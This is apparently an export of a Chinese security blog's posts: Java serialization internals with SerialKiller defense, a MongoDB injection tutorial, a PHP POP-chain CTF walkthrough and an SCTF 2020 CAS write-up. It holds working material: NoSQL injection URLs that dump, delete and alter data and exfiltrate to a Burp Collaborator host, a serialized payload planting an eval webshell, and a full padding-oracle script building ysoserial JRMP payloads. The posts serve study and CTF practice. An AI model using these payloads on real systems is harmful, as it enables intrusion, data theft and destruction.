0x66697273746e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b 3: Object - L - 0x4c fieldName Length - 8 - 0x00 08 Value - lastname - 0x6c6173746e616d65 className1 TC_REFERENCE - 0x71 Handle - 8257537 - 0x00 7e 00 01 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata User values age (int)20 - 0x00 00 00 14 money (int)100 - 0x00 00 00 64 firstname (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 6 - 0x00 06 Value - cl0und - 0x636c30756e64 lastname (object) TC_STRING - 0x74 newHandle 0x00 7e 00 04 Length - 5 - 0x00 05 Value - lisan - 0x6c6973616e 可以看到在序列化的时候世界上是写入了各字段长度的，所以在后面反序列化读的时候是按照字段长度来进行读取的。这也解释了为什么在反序列化数据后面插入脏数据会不会影响反序列化。 反序列化预处理反序列化和序列化互为称操作，其主要的操作在readObject0里面 case到object进行反序列化，整个object的反序化在readOrdinaryObject中 和序列化对称还是分两步，第一步是读取出类的元信息（readClassDesc），第二步是读取出对象属性具体的数据（readSerialData）。 反序列化数据readClassDesc在序列化那里提到过，对把类类型分成四个类型处理，这里的User是非代理普通类，就走readNonProxyDesc。 readNonProxyDesc中主要的操作在readClassDescriptor、resolveClass、initNonProxy（注意这里initNonProxy的最后一个传参，这里递归调用了readClassDesc）。 readClassDescriptor读出了类的元数据并把每一个属性名抽象成了ObjectStreamField类 resolveClass对类类型进行了构建，注意这里第二参数为false，意味着并不会执行类的初始化（static代码块不执行）。 另外注意这里解释了为什么设置反序列化防御的点是在resolveClass，如果想对反序列化设置防御，就需要自己实现一个ObjectInputStream。 12345678910class MyObjInputStream extends ObjInputStream { public MyObjInputStream(InputStream in) throws IOException{ super(in); } protected Class&lt;?&gt; resolveClass(ObjInputStream desc) throws IOException, ClassNotFoundException { System.out.println(\"defence\"); return super.resolveClass(desc) }} initNonProxy又构建了类的元信息。 最后desc（ObjectStreamClass）传出给外层readOrdinaryObject。首先会进行对象的初始化，然后读出数据注入类中。 readSerialData如果我们自定义了readObject方法，那么这里就会invoke，这里解释了为什么就java反序列化使用而言是反序列化类的readObject开始。 但是在User类中在我们并没有自定义反序列化方法随意还是走默认路线。 defaultReadFields，中第一个循环把原生类型数据赋给obj，第二个循环把数组、枚举类型、对象类型赋给obj。 补充一张整个反序列化的时序图。 从SerialKiller来java反序列化防御https://github.com/ikkisoft/SerialKiller原生使用 12ObjectInputStream ois = new ObjectInputStream(is);String msg = (String) ois.readObject(); 加上SerialKiller后的使用 12ObjectInputStream ois = new SerialKiller(is, \"/etc/serialkiller.conf\");String msg = (String) ois.readObject(); 可以看到它的原理就是上面提的自己实现流并且在resolveClass处加上白名单或者黑名单的过滤。 杂当父子接口同时实现了Serializable接口时 1234567891011121314151617181920212223class UserBase implements Serializable{ public int age; UserBase(){ System.out.println(\"UserBase无参构造\"); } UserBase(int age){ this.age = age; System.out.println(\"UserBase有参构造\"); }}class User2 extends UserBase implements Serializable{ User2(){ System.out.println(\"User2无参构造\"); } User2(int age){ this.age = age; System.out.println(\"User2有参构造\"); }} 控制台输出 1234UserBase无参构造User2有参构造-----------------2333 当只有子类实现Serializable接口父类没有实现时。 123456789101112131415161718192021222324252627282930313233343536373839import java.io.*;public class SerialAndUnserial { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectOutputStream oops = new ObjectOutputStream(new FileOutputStream(\"./serializable.txt\")); oops.writeObject(new User2(2333)); System.out.println(\"-----------------\"); ObjectInputStream oips = new ObjectInputStream(new FileInputStream(\"./serializable.txt\")); User2 user = (User2) oips.readObject(); System.out.println(user.age); }}class UserBase { public int age; UserBase(){ System.out.println(\"UserBase无参构造\"); } UserBase(int age){ this.age = age; System.out.println(\"UserBase有参构造\"); }}class User2 extends UserBase implements Serializable{ User2(){ System.out.println(\"User2无参构造\"); } User2(int age){ this.age = age; System.out.println(\"User2有参构造\"); }} 12345UserBase无参构造User2有参构造-----------------UserBase无参构造0 总结及一些tip 序列化时，当写入类的元数据的时候，是先写子类的类元数据，然后递归调用的写入父类的类元数据（只有实现序列化接口的才会有类元数据）。 防御反序列化的原理是在resolveClass处设防而不是readResolve 在序列化数据末尾加入脏数据不会影响正常的反序列化。 参考java中的序列化与反序列化及其源码分析（特别详细）先知大会议题Java反序列化实战[从WebLogic看反序列化漏洞的利用与防御](","link":"/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"},{"title":"MONGODB注入学习","text":"写在前面主要是对网上paper的一些总结以及最近遇到场景的一些总结。 千万不要用php7搭环境！千万不要用php7搭环境！千万不要用php7搭环境！ 对比一下代码量可以发现php7的mongodb扩展实在是太恶心了。所以不嫌麻烦的话建议用ubuntu14。 php5 1(new MongoClient())-&gt;{$db}-&gt;{$collection}-&gt;findOne(['_id' =&gt; $id]); php7 123$mongo = new MongoDB\\Driver\\Manager();$result = $mongo-&gt;executeQuery('db.collection', new MongoDB\\Driver\\Query(['_id'=&gt;$id], []), new MongoDB\\Driver\\ReadPreference(MongoDB\\Driver\\ReadPreference::RP_PRIMARY_PREFERRED));// 返回的$result是一个对象，需要手动转换成数组。 环境搭建lamp环境 123sudo apt-get apache2sudo apt-get install php5 php-pear php5-devsudo apt-get install libsasl2-dev 安装php mongdb扩展 1pecl install mongodb 额外安装mongodb server，注意不要用apt-get自带的安装，那个版本貌似比较低，用不了简洁的php写法 12345wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.9.tgztar -zxvf mongodb-linux-x86_64-ubuntu1404-3.4.9.tgzcd mongodb-linux-x86_64-ubuntu1404-3.4.9/binsudo apt-get install mongodb-server 将extension=mongodb.so放入的php.ini中，因为装的apache故修改/etc/php/7.0/apache2 另外mongodb还有一个28017端口是mongodb的web管理接口 基本简单操作 切换或创建数据库 1use runoob 删除数据库 1db.dropDatabase() 创建集合 1db.site.insert(&quot;goole&quot;:&quot;www.google.com&quot;) 删除集合 1db.site.drop() 插入文档 1234db.users.insert({ username:&quot;cl0und&quot;, password:&quot;cl0und1pass&quot;}) 更新文档update法 1db.site.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}}) save法 123456db.collection.save( &lt;document&gt;, { writeConcern: &lt;document&gt; }) 删除文档 1234567db.collection.remove( &lt;query&gt;, { justOne: &lt;boolean&gt;, writeConcern: &lt;document&gt; }) 主要说说查找在我所见的paper中基本上都是讲通过查找注入。 1db.user.find({'id':{$gt:1}}) #从当前数据库的集合user中查找id大于1文档 可以发现查询的时候常常会用一些逻辑操作符，而一部分注入姿势就是由此而来的（下面会说到） gt 大于 {“field”: {$gt: value}} lt 小于 {“field”: {$lt: value}} gte 大于等于 {“field”: {$gte: value}} lte 小于等于 {“field”: {$lte: value}} ne 不等于 {“member.age”: {$ne: “mine”}} exists 存在与否 {“member”: {$exists: true}}} in 包含 {“member.age”: {$in: [null], “$exists: true”}} exists 存在与否 {“couponsCode.0”: {$exists: 1}} #数组存在第一条数据 or 或者 {“$or”: [{“member.age”: “23”}, {“member.name”: “23333”}]} and 并且 {“$and”: [{“member.age”: “23”}, {“member.name”: “23333”}]} regex 正则 ({“name”:{“$regex”:’^a$’}}) size 个数 ({“name”:{“$size”:3}}) # $size name元素数为3 注入姿势开始之前先写一点测试数据进mongodb 12345678910111213use testdb.users.insert({ username:&quot;cl0und&quot;, password:&quot;cl0und1pass&quot;})db.users.insert({ username:&quot;cl0und2&quot;, password:&quot;cl0und2pass&quot;})db.users.insert({ username:&quot;cl0und3&quot;, password:&quot;cl0und3pass&quot;}) 回显注入-数组绑定注入偷了一个网上的脚本。可以把他看到成一个简单的登陆验证demo 1234567891011121314151617181920212223242526&lt;?phpini_set(\"display_errors\", \"On\");error_reporting(E_ALL | E_STRICT);//echo extension_loaded(\"mongodb\") ? \"loaded\\n\" : \"not loaded\\n\";$mongo = new MongoClient();$db = $mongo-&gt;test; //选择数据库$coll = $db-&gt;users; //选择集合$username = $_GET['username'];$password = $_GET['password'];//var_dump($_GET);$data = array( 'username'=&gt;$username, 'password'=&gt;$password );$data = $coll-&gt;find($data);$count = $data-&gt;count();if ($count&gt;0) { foreach ($data as $user) { echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; }}else{ echo '未找到';}?&gt; 正常url http://192.168.62.151/mongo.php?username=cl0und&amp;password=cl0und1pass 相当于执行了 1db.users.find({username:&quot;cl0und&quot;,password:&quot;cl0und1pass&quot;}) 那么结合php可以传数组的特性可以 注入url http://192.168.62.151/mongo.php?username[$ne]=cl0und&amp;password[$ne]=cl0und1pass 相当于执行了 1db.users.find({username:{$ne:&quot;cl0und&quot;},password:{$ne:&quot;cl0und1pass&quot;}}) 这样通过数组的嵌套成功的改变了代码执行的逻辑，下面的例子来自于一次做题 这里要通过员工的工号才能注册，但是在不知道工号情况下可以尝试注入。抓包可以发现数据是以json格式上传的，以及之前步骤的一些提示可以猜到后台数据库是以mongodb。因为2333这个工号不存在，而jobnumber这个点又有注入，所以成功绕过注册限制。 回显注入-字符串拼接注入这种注入特点和传统的sql注入类似，因为程序员直接拼接的sql语句，造成代码与数据边界不清。因为mongoddb是用js来操作的，所以注入语句符合js语法就好。偷脚本 123456789101112131415161718&lt;?php$username = $_GET['username'];$password = $_GET['password'];$query = \"var data = db.users.findOne({username:'$username',password:'$password'});return data;\";$mongo = new mongoclient();$db = $mongo-&gt;test;$data = $db-&gt;execute($query);if ($data['ok'] == 1) { if ($data['retval']!=NULL) { echo 'username:'.$data['retval']['username'].\"&lt;/br&gt;\"; echo 'password:'.$data['retval']['password'].\"&lt;/br&gt;\"; }else{ echo '未找到'; }}else{ echo $data['errmsg'];}?&gt; 网上的payload靠注释改变代码逻辑，但是实际使用不行，原因大概该是高版本不支持注释的原因http://192.168.62.151/mongo.php?username=cl0und%27});return%20{username:1,password:2};//&amp;password=cl0und1pass1 可以改变策略闭合后面的代码http://192.168.62.151/mongo.php?username=cl0und'});return ({username:1,password:2});var foo = ({'foo':'&amp;password=cl0und1pass1 然后后续步骤和sql注入类似 查看版本()http://192.168.62.151/mongo.php?username=cl0und'});return ({username:version(),password:2});var foo = ({'foo':' 查看当前数据库http://192.168.62.151/mongo.php?username=cl0und'});return ({username:tojson(db),password:2});var foo = ({'foo':' 查看当前集合http://192.168.62.151/mongo.php?username=cl0und'});return {username:tojson(db.getCollectionNames()),password:2};({foo:'1&amp;password=123456 查看文档http://192.168.62.151/mongo.php?username=cl0und'});return {username:tojson(db.users.find()),password:2};({foo:'1&amp;password=123456 这里貌似一次性不能查看全部，这样会回显一些，看起来像是内部的脚本，暂时不知道是什么 需要一条一条的看 联想到多条语句执行，是不是可以插入数据？http://192.168.62.151/mongo.php?username=cl0und'});db.users.insert({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({'foo':' 那还能删除数据http://192.168.62.151/mongo.php?username=cl0und'});db.users.remove({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({'foo':' 还能删库跑路http://192.168.62.151/mongo.php?username=cl0und'});db.users.remove({});var foo = ({'foo':' 更新别人密码http://192.168.62.151/mongo.php?username=cl0und'});db.users.update({'username':'cl0und'},{$set:{'password':'hack'}});var foo = ({'foo':' 布尔盲注以一个例子说明，注册一个用户名为cctrue,这里的功能是根据上传的用户名，查询所管理的机器（没有越权） 当传上去的用户名正常的时候 当不存在用户名，或者身份验证失败的时候 测试出注入点 盲注思路是用表达式的结果为true时和cc相加重新变成用户名ccture 确认版本信息 同样可以用于bool盲注还有$regix操作符 时间盲注给个demodb.users.find({'$where':'function() {sleep(5000);}'}) 在数组绑定的代码下实验这个demo,发现因为mongodb或者php驱动的限制，不能正常用http://192.168.62.151/mongo.php?username=cl0und&amp;password[$where]=function(){return%20sleep((5000);} 带外注入实际没有用过，仅仅作一种探索 查看版本db.copyDatabase('cl0und','test',version()+'.wssyoum9pyibk4uaukl9y0okxb31rq.burpcollaborator.net') 因为查询出来的json格式有和url标准冲突的特殊字符所以需要剔除，还有每个文档一般都会有一个 _id ,z这个id也往往不那么重要所以也可以剔除。在看文档的想找到mongodb有关base64或者16进制的字符串转换方法，不过很可惜没有找到，所以做了一下的折中处理。 db.copyDatabase('cl0und','test',tojson(db.users.findOne({},{_id:0})).replace(new RegExp(&quot;:| |,|\\&quot;|{|}&quot;,&quot;gm&quot;),&quot;&quot;)+'.e2hvfklnuw3ciolc2r4s9hd9o0uqif.burpcollaborator.net') 留坑 多个mongodb节点数据不一致性 CSRF 最后寒假快乐 参考http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/ https://www.owasp.org/index.php/Testing_for_NoSQL_injection","link":"/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"title":"POP链学习","text":"挖掘思路 能控制反序列化的点 反序列化类有魔术方法 魔术方法里有敏感操作（常规思路） 魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链） demo来自的柠檬师傅博客，建议小伙伴们拿到自己先做一下，构造pop的方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }};class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace('\\n', $this-&gt;endl, $txt); return $txt; }};class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(\"E:\\\\WWW\\\\test\\\\ctf\" . $this-&gt;filename, $txt, FILE_APPEND); }};class Logger { protected $logwriter;//这里装入LogWriter_File对象 function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) {//这里偷梁换柱Song的log $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(\"/\\[i\\](.*)\\[\\/i\\]/i\", \"&lt;i&gt;\\\\1&lt;/i&gt;\"); $this-&gt;logger = new Logger(new LogWriter_File(\"song_views\", new LogFileFormat(array($fltr), \"\\n\"))); } function __toString() { return \"&lt;a href='\" . $this-&gt;url . \"'&gt;&lt;i&gt;\" . $this-&gt;name . \"&lt;/i&gt;&lt;/a&gt; by \" . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(\"Song \" . $this-&gt;name . \" by [i]\" . $this-&gt;group . \"[/i] viewed.\\n\"); } function get_name() { return $this-&gt;name; }}class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return \"&lt;p&gt;\" . $this-&gt;song-&gt;__toString() . \"&lt;/p&gt;&lt;p&gt;\" . str_replace(\"\\n\", \"&lt;br /&gt;\", $this-&gt;lyrics) . \"&lt;/p&gt;\\n\"; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return \"&lt;p&gt;&lt;a href='song.php?name=\" . urlencode($this-&gt;song-&gt;get_name()) . \"'&gt;\" . $this-&gt;song-&gt;get_name() . \"&lt;/a&gt;&lt;/p&gt;\"; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }};class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) { $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE['lyrics'])) { return unserialize(base64_decode($_COOKIE['lyrics'])); } else { setcookie('lyrics', base64_encode(serialize(array(1, 2)))); return array(1, 2); } }};class Porter { static function exportData($lyrics) { return base64_encode(serialize($lyrics)); } static function importData($lyrics) { return serialize(base64_decode($lyrics)); }};class Conn { protected $conn; function __construct($dbuser, $dbpass, $db) { $this-&gt;conn = mysqli_connect(\"localhost\", $dbuser, $dbpass, $db); } function getLyrics($lyrics) { $r = array(); foreach ($lyrics as $lyric) { $s = intval($lyric); $result = $this-&gt;conn-&gt;query(\"SELECT data FROM lyrics WHERE id=$s\"); while (($row = $result-&gt;fetch_row()) != NULL) { $r []= unserialize(base64_decode($row[0])); } } return $r; } function addLyrics($lyrics) { $ids = array(); foreach ($lyrics as $lyric) { $this-&gt;conn-&gt;query(\"INSERT INTO lyrics (data) VALUES (\\\"\" . base64_encode(serialize($lyric)) . \"\\\")\"); $res = $this-&gt;conn-&gt;query(\"SELECT MAX(id) FROM lyrics\"); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); } echo var_dump($ids); return $ids; } function __destruct() { $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; }};unserialize($_GET['cmd']); 操作过程1、先找unserialize函数 在class user中有 12345678910111213141516171819class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) { $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE['lyrics'])) { return unserialize(base64_decode($_COOKIE['lyrics'])); } else { setcookie('lyrics', base64_encode(serialize(array(1, 2)))); return array(1, 2); } }}; 我们看到$oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));里面cookie可控 那么问题来了，一个可控的unserialize点意味着什么？ 意味着你能控制{当前的定义的类或者自动加载能找到的类}的属性（这个对象属性当然可以是一个对象） 接着就可以寻找可以搞事的魔术方法，很快就会发现class Lyrics中有两个魔术方法 123456function __toString() { return \"&lt;p&gt;\" . $this-&gt;song-&gt;__toString() . \"&lt;/p&gt;&lt;p&gt;\" . str_replace(\"\\n\", \"&lt;br /&gt;\", $this-&gt;lyrics) . \"&lt;/p&gt;\\n\";}function __destruct() { $this-&gt;song-&gt;log();} 我们发现两个魔术方法都没有什么敏感的操作，那么这个时候我们可以考虑构造POP链 通读代码可以发现程序员的本意是利用class song的log的方法，但是这个时候我们发现 class Logger也有log方法 123456789class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }}; 更加惊奇的是我们发现一个可以写文件的类这个类中方法writeLog 12345678910111213class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(\"E:\\\\WWW\\\\test\\\\ctf\" . $this-&gt;filename, $txt, FILE_APPEND); }}; 至此一条完整的POP链思路貌似出现在眼前 我们新建一个Lyrics对象将它的song属性填充成Logger对象,再把logger对象的logwriter的属性填充成LogWriter_File对象，最后传送给cookie,在Lyrics对象被销毁的时候就可以触发__destruct() 1234567&lt;?php$arr = array(new OutputFilter(\"//\",\"&lt;?php eval(\\$_POST['c']);?&gt;\"));$obj1 = new LogFileFormat($arr,'\\n');$obj2 = new LogWriter_File(\"shell2333.php\",$obj1);$obj3 = new Logger($obj2);$obj = new Lyrics(\"2333\",$obj3);file_put_contents(\"serialize.txt\", urlencode(serialize($obj))); serialize.txt可以找到这一坨O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A4%3A%222333%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A13%3A%22shell2333.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A26%3A%22%3C%3Fphp+eval%28%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D GET一次，即可拿到shell 最后记录一下反序列化注意点具体见Godot师傅 1、当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124) 2、CTF中成员属性数目前面多一个+可以绕过正则 3、protect属性和private会产生一些浏览器看不见的字符 4、会很有用的函数 get_included_files() , get_declared_classes() 5、如果通过上面的函数依然没有找到合适的类，可以尝试利用spl_autoload_register 6、session序列化反序列化机制不同造成漏洞 最最后无意间在看php文档的时候发现一个5.6.x后废弃的特性，叫做 ，功能是在上下文语境中可以调用用类::的模式调用非静态方法(?)，一个demo如下 最最最后如有问题请指教 国庆快乐！","link":"/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"title":"SCTF 2020 两道Login Me预期解的核心技术","text":"Login Me - cas 4.x excution rce（黑盒）详细的漏洞分析可以参考Apereo CAS 4.X execution参数反序列化漏洞分析这里不在赘述。文章提到了，前后两个版本区间的encode方法是不一样。 在cas4.x-cas.4.1.5中的加密伪代码如下 1234payload = gzip(Java Serialized data)body = aes128_cbc_encode(key, iv, payload))header = '\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x10'+iv+'\\x00\\x00\\x00\\x06'+'aes128'excution = uuid + b64encode(header + body) CAS 4.1.7 ～ 4.2.X的加密伪代码如下 1234cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))data = b64encode(cipher)jwsToken = jws.sign(data, jws_key, algorithm=‘HS512’)excution = uuid + b64encode(jwsToken) 因为encode的变化excution是不一样的亦可作为判断版本的指纹。 cas4.x-cas.4.1.5之前特征：execution base64解码出来以\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x10开头。 4.1.6之后特征：execution两次base64解码出来不是乱码而是jws格式（header.body.sign）的字符串。 解密题目的execution不难发现，环境是4.x-4.1.5。此外看到，前后两个版本的encode的方式唯一的差异是4.1.6之后execution的需要进行加密签名，联系到它使用的是aes/cbc说到这应该很熟悉了吧padding oracle！ 这里padding oracle，仍然需要讲究技巧，直接生成cc链一类的payload进行padding大约需要padding 114组左右数据（题目两小时重启一次，gadget还需要fuzz，这是一个难以完成的任务），但是如果环境能出网的话用jrmp就需要padding 14组数据左右了，这里视环境情况仍然需要跑1h-3h不等，但是通过的分析过cve-2018-2628之后发现jrmp的payload的可以更短只需要7组，我在同区域的阿里云上多线程跑不到20分钟就有了结果（这也是题目描述Time is Flag的暗示233333）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155from jose import jwsfrom Crypto.Cipher import AESfrom cStringIO import StringIOfrom multiprocessing.pool import ThreadPoolimport timeimport requestsimport base64import zlibimport uuidimport binasciiimport jsonimport subprocessimport requestsimport restart_time = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime())iv = uuid.uuid4().bytesheader_mode = '\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x10{iv}\\x00\\x00\\x00\\x06aes128'JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'URL= \"http://ip:port/login\"headers = {\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0\",\"Connection\":\"close\",\"Accept-Language\":\"en-US,en;q=0.5\",\"Accept-Encoding\":\"gzip, deflate\",\"Content-Type\":\"application/x-www-form-urlencoded\"}cookies = {\"JSESSIONID\":\"ADF6653ED3808BE63B052BCED53494A3\"}def base64Padding(data): missing_padding = 4 - len(data) % 4 if missing_padding and missing_padding != 4: data += '=' * missing_padding return datadef compress(data): gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16) data = gzip_compress.compress(data) + gzip_compress.flush() return datadef bitFlippingAttack(fake_value, orgin_value): iv = [] for f, o in zip(fake_value, orgin_value): iv.append(chr(ord(f) ^ ord(o))) return ivdef pad_string(payload): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() return pad(payload)def send_request(paramsPost,w): response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=False) return w, responsedef paddingOracle(value): fakeiv = list(chr(0)*16) intermediary_value_reverse = [] for i in range(0, 16): num = 16 response_result = [] for j in range(0, 256-num+1, num): jobs = [] pool = ThreadPool(num) for w in range(j, j + num): fakeiv[N-1-i] = chr(w) #print(fakeiv) fake_iv = ''.join(fakeiv) paramsPost = {\"execution\":\"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_\" + base64.b64encode(header + body + fake_iv + value),\"password\":\"admin\",\"submit\":\"LOGIN\",\"_eventId\":\"submit\",\"lt\":\"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org\",\"username\":\"admin\"} job = pool.apply_async(send_request, (paramsPost,w)) jobs.append(job) pool.close() pool.join() for w in jobs: j_value, response = w.get() #print(response) if response.status_code == 200: print(\"=\"*5 + \"200\" + \"=\"*5) response_result.append(j_value) print(response_result) if len(response_result) == 1: j_value = response_result[0] intermediary_value_reverse.append(chr((i+1) ^ j_value)) for w in range(0, i+1): try: fakeiv[N-w-1] = chr(ord(intermediary_value_reverse[w]) ^ (i+2)) except Exception as e: print(fakeiv, intermediary_value_reverse, w, i+1) print(base64.b64encode(value)) print(e) exit() print(fakeiv) else: print(response_result) print(\"Exit Because count of is \" + str(len(response_result))) exit() print(\"=\"*5 + \"sleep\" + \"=\"*5) time.sleep(1) intermediary_value = intermediary_value_reverse[::-1] return intermediary_valuedef pad_string(payload): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() return pad(payload)if __name__ == '__main__': popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'JRMPClient2', 'your_ip:your_port'],stdout=subprocess.PIPE) payload = popen.stdout.read() payload = pad_string(compress(payload)) excution = \"input_excution\" body = base64.b64decode(excution)[34:] header = base64.b64decode(excution)[0:34] iv = list(header[8:24]) N=16 fake_value_arr = re.findall(r'[\\s\\S]{16}', payload) fake_value_arr.reverse() value = body[-16:] payload_value_arr = [value] count = 1 all_count = len(fake_value_arr) print(all_count) for i in fake_value_arr: intermediary_value = paddingOracle(value) print(value, intermediary_value) fakeIv = bitFlippingAttack(intermediary_value, i) value = ''.join(fakeIv) payload_value_arr.append(value) print(count, all_count) count += 1 fakeiv = payload_value_arr.pop() payload_value_arr.reverse() payload = header_mode.format(iv=fakeiv) + ''.join(payload_value_arr) print(base64.b64encode(payload)) end_time = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) print(start_time,end_time) f = open('/tmp/cas.txt', 'w') f.write(base64.b64encode(payload)) f.close() 通过jrmp出来fuzz gadget也很方便，这里用的是JDK7u21（在自己做的时候发现统一端口请求一次jrmp之后，后面的再一次请求会变得很慢，这里可以选择再跑一个端口出来交替使用）。接下来就是常见的读取数据库连接字符串查用户登陆的操作了，在此不细表。 Login Me Again - shiro rce &amp;&amp; shiro bypass acl（白盒）这道题，由我和@leixiao合作完成，前半部分shiro不出网rce利用由leixiao负责完成，后半部分shiro bvpass acl部分由我负责完成。先贴一个当时构思这道题时候的速记（有删改）： 环境：外网一个有shiro rce的不出网应用（打包成jar），内网有一个spring+最新版shiro写一个只允许图的上传功能(打包成war)，上传功能需要管理员权限（shiro鉴权）部署在有ajp漏洞的tomcat7上。 攻击思路1.通过注入有socks5代理功能的webshell代理到内网。2.找shiro新的权限绕过方法或者谷歌搜到我之前找的shiro ajp越权：https://issues.apache.org/jira/browse/SHIRO-760，越权上传文件或者用c0ny1师傅的姿势。3.用ajp漏洞包含刚才上传的图片rce 利用难点：1.市面上还没有socks5代理功能的无文件webshell，需要选手自己从已有的jsp构造转换成无文件的webshell。2.自己挖越权或者搜到我之前提交的那个越权issue或者用其他办法。3.市面ajp协议的介绍较少，需要选手自己研究如何用ajp协议上传文件。 下面就从利用难点，逐一说明 